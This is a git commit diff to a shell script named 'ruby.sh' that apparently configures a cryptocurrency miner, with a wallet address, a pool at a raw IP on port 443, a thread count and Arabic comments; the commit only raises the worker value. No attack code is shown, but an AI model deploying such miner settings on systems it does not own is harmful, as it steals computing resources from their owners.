735562fa1d287288cd4e32d6600b4b8316ffc748
jaydmarks227 <34647974+jaydmarks227@users.noreply.github.com>
2025-12-18 19:33:20 +0100

    Update ruby.sh

--- ruby.sh
+++ ruby.sh
@@ -2,7 +2,7 @@
 
 # إعداد بيانات المحفظة والمعدّن
 WALLET="88DcxveXeHaRDYLbmAxBuMZBsYwEtrDcb4EUWJvCQjKsNo2ieFTrBLNBhpVdFfLTXnRDcnJgg7Fpre43fbFMnfxkV2ZrpEm"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="200"
+WORKER="300"
 POOL="45.155.102.89:443"
 THREADS=4
 # مجلد العمل
